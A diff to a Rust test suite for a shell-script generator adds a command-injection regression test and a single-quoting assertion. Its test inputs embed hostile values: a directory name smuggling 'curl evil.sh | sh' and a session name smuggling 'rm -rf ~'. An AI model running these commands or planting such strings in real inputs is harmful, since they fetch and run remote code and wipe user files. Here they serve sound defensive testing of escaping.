@@ -60,7 +60,7 @@ fn session_argument_forms() {
     let (with_s, _d1) = plan(Some("ses_abc"));
     let script = with_s.files.iter().find(|f| f.path.extension().map(|e| e == "sh").unwrap_or(false)).unwrap();
     let content = std::fs::read_to_string(&script.path).unwrap();
-    assert!(content.contains("--session ses_abc"), "带会话参数: {content}");
+    assert!(content.contains("--session 'ses_abc'"), "带会话参数: {content}");
 
     let (no_s, _d2) = plan(None);
     let script2 = no_s.files.iter().find(|f| f.path.extension().map(|e| e == "sh").unwrap_or(false)).unwrap();
@@ -86,4 +86,44 @@ fn cleanup_removes_stale_env_files() {
     cleanup_env_files(dir.path()).unwrap();
     assert!(!stale.exists(), "过期 env 文件被清理");
     assert!(fresh.exists(), "新鲜 env 文件保留");
+}
+
+#[test]
+#[cfg(unix)]
+fn hostile_directory_and_session_are_escaped() {
+    // I6 修复：目录/会话参数含单引号时必须转义（命令注入防护）
+    let evil_dir = "/tmp/x'; curl evil.sh | sh; '";
+    let evil_session = "ses'; rm -rf ~; '";
+    let dir = tempfile::tempdir().unwrap();
+    let plan = build_terminal_plan(
+        "opencode",
+        "http://127.0.0.1:9464",
+        evil_dir,
+        Some(evil_session),
+        Some(dir.path()),
+        "KEY",
+    )
+    .unwrap();
+    for f in &plan.files {
+        if f.path.extension().map(|e| e == "sh").unwrap_or(false) {
+            // 参数以字面量出现（被 '\'' 转义包裹），而非裸注入
+            assert!(
+                f.content.contains("'/tmp/x'\\''; curl evil.sh | sh; '\\'''"),
+                "目录被正确转义: {}",
+                f.content
+            );
+        }
+    }
+    // 2) 生成的脚本通过 bash 语法检查（单引号配对合法）
+    let script = plan
+        .files
+        .iter()
+        .find(|f| f.path.extension().map(|e| e == "sh").unwrap_or(false))
+        .unwrap();
+    let status = std::process::Command::new("/bin/bash")
+        .arg("-n")
+        .arg(&script.path)
+        .status()
+        .unwrap();
+    assert!(status.success(), "bash 语法检查通过（注入未破坏脚本结构）");
 }
